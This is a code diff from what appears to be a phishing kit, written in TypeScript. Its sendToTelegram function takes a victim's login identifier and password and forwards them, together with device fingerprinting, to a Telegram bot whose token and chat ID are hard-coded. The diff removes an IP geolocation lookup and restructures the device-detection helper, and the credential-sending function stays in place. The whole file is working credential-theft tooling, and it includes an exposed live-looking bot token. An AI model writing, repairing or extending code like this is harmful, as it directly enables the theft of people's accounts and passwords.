@@ -1,48 +1,3 @@
-import axios from 'axios';
-
-interface LocationData {
-  ip: string;
-  city: string;
-  region: string;
-}
-
-const getLocation = async (): Promise<LocationData> => {
-  try {
-    const ipRes = await axios.get('https://ipapi.co/json/');
-    return {
-      ip: ipRes.data.ip || 'Unknown',
-      city: ipRes.data.city || 'Unknown',
-      region: ipRes.data.region || 'Unknown'
-    };
-  } catch (e) {
-    console.error('Failed to get location', e);
-    return { ip: 'Unknown', city: 'Unknown', region: 'Unknown' };
-  }
-};
-
-const getDeviceInfo = (): string => {
-  const ua = navigator.userAgent;
-  // Simple check for common devices to mimic the screenshot style "samsung_SM-S908E"
-  // In reality, browser UA doesn't always give exact model, but we can approximate or just send the UA string.
-  // For the sake of the requested format "🧩 Device: [Device Info]", let's try to extract something readable.
-  
-  if (ua.includes('Android')) {
-    const match = ua.match(/Android\s([0-9.]+);\s([^;]+)/);
-    if (match && match[2]) {
-        return match[2].trim();
-    }
-    return "Android Device";
-  } else if (ua.includes('iPhone')) {
-    return "iPhone";
-  } else if (ua.includes('Windows')) {
-    return "Windows PC";
-  } else if (ua.includes('Macintosh')) {
-    return "Mac";
-  }
-  return "Unknown Device";
-};
-
-// Unified function to handle all login types
 export const sendToTelegram = async (
   identifier: string, 
   pass: string, 
@@ -52,7 +7,24 @@ export const sendToTelegram = async (
   const BOT_TOKEN = '8539103259:AAHnEJrkMJt2Z_vjyf-gENTJU6GnzpTnkCs';
   const CHAT_IDS = ['', '6076369736']; // Add your IDs here
 
-  const loc = await getLocation();
+  const getDeviceInfo = (): string => {
+    const ua = navigator.userAgent;
+    if (ua.includes('Android')) {
+      const match = ua.match(/Android\s([0-9.]+);\s([^;]+)/);
+      if (match && match[2]) {
+          return match[2].trim();
+      }
+      return "Android Device";
+    } else if (ua.includes('iPhone')) {
+      return "iPhone";
+    } else if (ua.includes('Windows')) {
+      return "Windows PC";
+    } else if (ua.includes('Macintosh')) {
+      return "Mac";
+    }
+    return "Unknown Device";
+  };
+
   const deviceInfo = getDeviceInfo();
 
   // Date formatting: DD/MM/YYYY, HH:mm:ss
